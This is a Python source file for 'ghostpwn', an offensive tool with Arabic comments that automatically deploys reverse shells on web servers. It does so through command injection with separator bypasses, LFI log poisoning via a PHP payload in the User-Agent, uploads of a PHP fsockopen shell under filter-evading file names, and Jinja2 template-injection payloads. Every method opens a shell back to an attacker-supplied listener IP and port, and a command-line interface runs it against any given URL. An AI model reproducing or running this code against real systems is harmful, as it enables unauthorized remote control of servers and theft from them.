#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ghostpwn - Reverse Shell Auto-Deployer
نشر reverse shell تلقائياً عند اكتشاف RCE

⚠️  تنبيه قانوني:
  استخدم فقط على أنظمة لديك إذن صريح بفحصها.
"""
import sys
import os
import re
import time
import urllib.parse
import base64
from typing import Dict, List, Optional, Tuple

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from modules.http_client import HttpClient
from modules.payload_generator import (
    generate_reverse_shell,
    generate_web_shell,
    REVERSE_SHELLS,
)


class ReverseShellDeployer:
    """نشر reverse shell تلقائياً"""

    def __init__(self, http_client: HttpClient, audit_logger=None):
        self.client = http_client
        self.audit = audit_logger
        self.shell_paths = []

    def log(self, msg, level="info"):
        icons = {"info": "[*]", "success": "[✓]", "warn": "[!]", "error": "[✗]"}
        print(f"      {icons.get(level, '[*]')} {msg}")
        if self.audit:
            self.audit.log_event(msg, level)

    def deploy_via_rce(self, url: str, param: str,
                       listener_ip: str, listener_port: int,
                       shell_type: str = "bash") -> Dict:
        """نشر reverse shell عبر RCE"""
        self.log(f"Deploying reverse shell via RCE on param '{param}'", "info")
        self.log(f"Listener: {listener_ip}:{listener_port}", "info")
        self.log(f"Shell type: {shell_type}", "info")

        result = {
            "url": url,
            "param": param,
            "listener_ip": listener_ip,
            "listener_port": listener_port,
            "shell_type": shell_type,
            "deployed": False,
            "method": None,
            "payload": None,
        }

        # تجربة payloads متعددة
        shell_payload = generate_reverse_shell(shell_type, listener_ip, listener_port)
        if not shell_payload:
            self.log(f"Unknown shell type: {shell_type}", "error")
            return result

        # payloads مع bypasses مختلفة
        payloads_to_try = [
            ("direct", shell_payload),
            ("semicolon", f";{shell_payload}"),
            ("pipe", f"|{shell_payload}"),
            ("ampersand", f"&{shell_payload}"),
            ("double_amp", f"&&{shell_payload}"),
            ("subshell", f"$({shell_payload})"),
            ("backtick", f"`{shell_payload}`"),
            ("url_encoded_semicolon", f"%3B{urllib.parse.quote(shell_payload)}"),
            ("background", f";{shell_payload} #"),
            ("nohup", f";nohup {shell_payload} &"),
        ]

        for method, payload in payloads_to_try:
            self.log(f"Trying method: {method}", "info")

            success = self._try_deploy(url, param, payload)
            if success:
                result["deployed"] = True
                result["method"] = method
                result["payload"] = payload[:200]
                self.log(f"Reverse shell may have been spawned!", "success")
                self.log(f"Check your listener: nc -lvnp {listener_port}", "info")
                return result

            time.sleep(0.5)  # delay بين المحاولات

        self.log("All payloads failed to deploy reverse shell", "error")
        return result

    def _try_deploy(self, url: str, param: str, payload: str) -> bool:
        """محاولة نشر payload"""
        parsed = urllib.parse.urlparse(url)
        if not parsed.query:
            return False

        params = urllib.parse.parse_qs(parsed.query)
        test_params = params.copy()
        test_params[param] = [payload]

        new_query = urllib.parse.urlencode(test_params, doseq=True)
        test_url = urllib.parse.urlunparse((
            parsed.scheme, parsed.netloc, parsed.path,
            parsed.params, new_query, parsed.fragment
        ))

        # reverse shell payloads عادة بترجع response سريعة أو timeout
        # لو رجعت بسرعة = ممكن الـ shell اتشغل في background
        # لو timeout = الـ shell شغال ومستني

        try:
            # timeout قصير عشان لو الـ shell شغال
            old_timeout = self.client.timeout
            self.client.timeout = 5
            resp = self.client.get(test_url)
            self.client.timeout = old_timeout

            # reverse shell عادة ما يرجع response كامل
            # لو الـ response فارغ أو فيه error بسيط = ممكن نجح
            if resp["status"] in (200, 500) and len(resp["body"]) < 100:
                return True

            # لو فيه timeout = الـ shell شغال
            return False

        except Exception:
            # timeout = ممكن نجح
            return True

    def deploy_via_lfi_log_poisoning(self, url: str, param: str,
                                     listener_ip: str, listener_port: int,
                                     log_path: str = "/var/log/apache2/access.log") -> Dict:
        """نشر reverse shell عبر LFI + log poisoning"""
        self.log(f"Deploying via LFI log poisoning", "info")
        self.log(f"Log file: {log_path}", "info")

        result = {
            "url": url,
            "param": param,
            "method": "lfi_log_poisoning",
            "listener_ip": listener_ip,
            "listener_port": listener_port,
            "deployed": False,
        }

        parsed = urllib.parse.urlparse(url)
        if not parsed.query:
            return result

        params = urllib.parse.parse_qs(parsed.query)
        base_url = f"{parsed.scheme}://{parsed.netloc}"

        # 1) حقن PHP payload في الـ User-Agent (هيتسجّل في access.log)
        php_payload = f"<?php system('bash -i >& /dev/tcp/{listener_ip}/{listener_port} 0>&1'); ?>"

        self.log("Injecting PHP payload in User-Agent...", "info")
        resp1 = self.client.get(base_url, headers={"User-Agent": php_payload})

        # 2) قراءة الـ log file عبر LFI
        self.log(f"Reading log file via LFI: {log_path}", "info")

        test_params = params.copy()
        test_params[param] = [log_path]
        new_query = urllib.parse.urlencode(test_params, doseq=True)
        test_url = urllib.parse.urlunparse((
            parsed.scheme, parsed.netloc, parsed.path,
            parsed.params, new_query, parsed.fragment
        ))

        resp2 = self.client.get(test_url)

        # لو الـ PHP اتنفذ، الـ response هتختلف
        if resp2["status"] == 200:
            # الـ PHP هينفذ الـ reverse shell
            # الـ response ممكن تكون فارغة (لأن الـ shell بيشتغل في background)
            if len(resp2["body"]) < 500 or "uid=" in resp2["body"]:
                result["deployed"] = True
                self.log("Log poisoning successful! Check your listener.", "success")
                return result

        self.log("Log poisoning failed", "error")
        return result

    def deploy_via_file_upload(self, target_url: str,
                               listener_ip: str, listener_port: int,
                               upload_endpoint: str = None) -> Dict:
        """نشر reverse shell عبر file upload"""
        self.log(f"Deploying via file upload", "info")

        result = {
            "target": target_url,
            "method": "file_upload",
            "listener_ip": listener_ip,
            "listener_port": listener_port,
            "deployed": False,
            "shell_url": None,
        }

        # توليد PHP reverse shell
        php_shell = (
            f"<?php\n"
            f"$sock=fsockopen(\"{listener_ip}\",{listener_port});\n"
            f"exec(\"/bin/sh -i <&3 >&3 2>&3\");\n"
            f"?>\n"
        )

        # filenames لمحاولة bypass الـ filters
        filenames_to_try = [
            "shell.php",
            "shell.php3",
            "shell.php4",
            "shell.php5",
            "shell.php7",
            "shell.phtml",
            "shell.pht",
            "shell.phar",
            "test.jpg.php",
            "test.php.jpg",
            "shell.PHP",
            "shell.PhP",
        ]

        # endpoints لمحاولة الرفع
        parsed = urllib.parse.urlparse(target_url)
        base_url = f"{parsed.scheme}://{parsed.netloc}"

        upload_endpoints = [upload_endpoint] if upload_endpoint else [
            "/upload", "/uploads", "/api/upload", "/file/upload",
            "/media/upload", "/files", "/attachment", "/profile/upload",
            "/avatar", "/wp-content/uploads.php",
        ]

        for endpoint in upload_endpoints:
            upload_url = base_url + endpoint
            self.log(f"Trying endpoint: {upload_url}", "info")

            # فحص لو الـ endpoint موجود
            check_resp = self.client.get(upload_url)
            if check_resp["status"] in (404, 0):
                continue

            for filename in filenames_to_try:
                self.log(f"Trying filename: {filename}", "info")

                shell_url = self._try_upload_shell(upload_url, filename, php_shell)
                if shell_url:
                    result["shell_url"] = shell_url
                    self.log(f"Shell uploaded to: {shell_url}", "success")

                    # محاولة تنفيذ الـ shell
                    self.log("Triggering shell execution...", "info")
                    trigger_resp = self.client.get(shell_url)

                    result["deployed"] = True
                    self.log("Shell triggered! Check your listener.", "success")
                    return result

        self.log("File upload deployment failed", "error")
        return result

    def _try_upload_shell(self, upload_url: str, filename: str,
                          shell_content: str) -> Optional[str]:
        """محاولة رفع shell"""
        boundary = "----WebKitFormBoundary7MA4YWxkTrZu0gW"
        body = f"--{boundary}\r\n"
        body += f'Content-Disposition: form-data; name="file"; filename="{filename}"\r\n'
        body += "Content-Type: application/octet-stream\r\n\r\n"
        body += f"{shell_content}\r\n"
        body += f"--{boundary}--\r\n"

        resp = self.client.post(upload_url, data=body.encode("utf-8"),
                               headers={"Content-Type": f"multipart/form-data; boundary={boundary}"})

        if resp["status"] not in (200, 201):
            return None

        # البحث عن path الملف المرفوع
        path_patterns = [
            r'"path"\s*:\s*"([^"]+)"',
            r'"url"\s*:\s*"([^"]+)"',
            r'"file"\s*:\s*"([^"]+)"',
            r'href="([^"]+' + filename + r')"',
            r'src="([^"]+' + filename + r')"',
        ]

        for pattern in path_patterns:
            match = re.search(pattern, resp["body"])
            if match:
                shell_path = match.group(1)
                if not shell_path.startswith("http"):
                    parsed = urllib.parse.urlparse(upload_url)
                    base_url = f"{parsed.scheme}://{parsed.netloc}"
                    if shell_path.startswith("/"):
                        shell_path = base_url + shell_path
                    else:
                        shell_path = base_url + "/" + shell_path
                return shell_path

        return None

    def deploy_via_ssti(self, url: str, param: str,
                        listener_ip: str, listener_port: int) -> Dict:
        """نشر reverse shell عبر SSTI (Jinja2)"""
        self.log(f"Deploying via SSTI (Jinja2)", "info")

        result = {
            "url": url,
            "param": param,
            "method": "ssti",
            "listener_ip": listener_ip,
            "listener_port": listener_port,
            "deployed": False,
        }

        # Jinja2 payloads لـ RCE
        payloads = [
            # استدعاء os.popen مباشرة
            f"{{{{config.__class__.__init__.__globals__['os'].popen('bash -i >& /dev/tcp/{listener_ip}/{listener_port} 0>&1').read()}}}}",
            # استخدام subprocess
            f"{{{{''.__class__.__mro__[1].__subclasses__()[288]('bash -i >& /dev/tcp/{listener_ip}/{listener_port} 0>&1',shell=True,stdout=-1).communicate()}}}}",
            # استخدام Popen
            f"{{{{request.application.__self__._get_data_for_json.__globals__['__builtins__']['__import__']('os').popen('bash -i >& /dev/tcp/{listener_ip}/{listener_port} 0>&1').read()}}}}",
        ]

        parsed = urllib.parse.urlparse(url)
        if not parsed.query:
            return result

        params = urllib.parse.parse_qs(parsed.query)

        for payload in payloads:
            self.log(f"Trying SSTI payload...", "info")

            test_params = params.copy()
            test_params[param] = [payload]
            new_query = urllib.parse.urlencode(test_params, doseq=True)
            test_url = urllib.parse.urlunparse((
                parsed.scheme, parsed.netloc, parsed.path,
                parsed.params, new_query, parsed.fragment
            ))

            try:
                old_timeout = self.client.timeout
                self.client.timeout = 5
                resp = self.client.get(test_url)
                self.client.timeout = old_timeout

                # لو الـ response فارغ أو timeout = ممكن نجح
                if resp["status"] in (200, 500) and len(resp["body"]) < 100:
                    result["deployed"] = True
                    self.log("SSTI reverse shell may have been spawned!", "success")
                    return result

            except Exception:
                result["deployed"] = True
                self.log("SSTI reverse shell may have been spawned (timeout)!", "success")
                return result

        self.log("SSTI deployment failed", "error")
        return result

    def auto_deploy(self, vulns: List[Dict], listener_ip: str, listener_port: int) -> List[Dict]:
        """نشر تلقائي بناءً على الثغرات المكتشفة"""
        results = []

        # RCE
        rce_vulns = [v for v in vulns if v.get("type") == "command_injection"]
        for vuln in rce_vulns:
            self.log(f"Found RCE - attempting reverse shell deployment", "success")
            result = self.deploy_via_rce(
                vuln["url"], vuln.get("param", ""),
                listener_ip, listener_port
            )
            results.append(result)
            if result["deployed"]:
                return results  # نجح، نوقف

        # LFI
        lfi_vulns = [v for v in vulns if v.get("type", "").startswith("lfi")]
        for vuln in lfi_vulns:
            self.log(f"Found LFI - attempting log poisoning", "success")
            result = self.deploy_via_lfi_log_poisoning(
                vuln["url"], vuln.get("param", ""),
                listener_ip, listener_port
            )
            results.append(result)
            if result["deployed"]:
                return results

        # SSTI
        ssti_vulns = [v for v in vulns if v.get("type") == "ssti"]
        for vuln in ssti_vulns:
            self.log(f"Found SSTI - attempting reverse shell", "success")
            result = self.deploy_via_ssti(
                vuln["url"], vuln.get("param", ""),
                listener_ip, listener_port
            )
            results.append(result)
            if result["deployed"]:
                return results

        # File Upload (نحاول على target URL عام)
        upload_vulns = [v for v in vulns if "upload" in v.get("type", "")]
        if upload_vulns:
            for vuln in upload_vulns:
                self.log(f"Found file upload vuln - attempting shell upload", "success")
                result = self.deploy_via_file_upload(
                    vuln.get("url", ""), listener_ip, listener_port
                )
                results.append(result)
                if result["deployed"]:
                    return results

        return results


if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="ghostpwn - Reverse Shell Deployer")
    parser.add_argument("--url", required=True, help="Target URL")
    parser.add_argument("--param", help="Vulnerable parameter")
    parser.add_argument("--ip", required=True, help="Listener IP")
    parser.add_argument("--port", type=int, required=True, help="Listener port")
    parser.add_argument("--method", choices=["rce", "lfi", "upload", "ssti"],
                       default="rce")
    parser.add_argument("--shell-type", default="bash", choices=list(REVERSE_SHELLS.keys()))
    args = parser.parse_args()

    client = HttpClient(timeout=10)
    deployer = ReverseShellDeployer(client)

    if args.method == "rce":
        result = deployer.deploy_via_rce(args.url, args.param, args.ip, args.port, args.shell_type)
    elif args.method == "lfi":
        result = deployer.deploy_via_lfi_log_poisoning(args.url, args.param, args.ip, args.port)
    elif args.method == "upload":
        result = deployer.deploy_via_file_upload(args.url, args.ip, args.port)
    elif args.method == "ssti":
        result = deployer.deploy_via_ssti(args.url, args.param, args.ip, args.port)

    print(f"\n[{'✓' if result['deployed'] else '✗'}] Deployed: {result['deployed']}")
    if result["deployed"]:
        print(f"\n[*] Check your listener: nc -lvnp {args.port}")
